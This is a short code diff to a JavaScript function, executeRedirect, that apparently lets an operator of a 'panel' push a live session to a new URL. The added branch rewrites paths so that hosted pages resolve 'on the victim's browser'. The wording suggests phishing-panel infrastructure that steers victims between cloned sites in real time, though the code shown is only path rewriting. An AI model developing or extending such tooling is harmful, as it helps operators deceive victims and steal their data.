@@ -86,6 +86,7 @@ async function executeRedirect(io, sessionId, targetUrl, adminUserId, options = 
     } else {
       const hasOwnDomain = website && (website.deploy_domain || (website.domain && website.domain_active) || website.live_domain);
       if (hasOwnDomain && website.demo_slug) {
+        // Site is on its own domain — strip any slug prefix so paths are root-relative.
         const slug = website.demo_slug;
         const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
         const original = targetUrl;
@@ -94,6 +95,21 @@ async function executeRedirect(io, sessionId, targetUrl, adminUserId, options = 
         targetUrl = targetUrl.replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/');
         if (targetUrl !== original) {
           console.log(`[redirect] stripped slug for hosted site: ${original} → ${targetUrl}`);
+        }
+      } else if (website && website.demo_slug && targetUrl && !/^https?:\/\//i.test(targetUrl) && targetUrl.charAt(0) === '/') {
+        // No own domain — site is served under /<slug>/ on the panel host.
+        // Prepend the slug so the URL resolves correctly on the victim's browser.
+        const slug = website.demo_slug;
+        const esc = slug.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+        const original = targetUrl;
+        // Strip any stale /demo/<slug>/ or /<slug>/ prefix first, then rebuild as /<slug>/
+        let pagePart = targetUrl
+          .replace(new RegExp('^\\/demo\\/' + esc + '\\/', 'i'), '/')
+          .replace(new RegExp('^\\/' + esc + '\\/', 'i'), '/')
+          .replace(/^\//, '');
+        targetUrl = '/' + slug + '/' + pagePart;
+        if (targetUrl !== original) {
+          console.log(`[redirect] panel-hosted — added slug prefix: ${original} → ${targetUrl}`);
         }
       }
     }
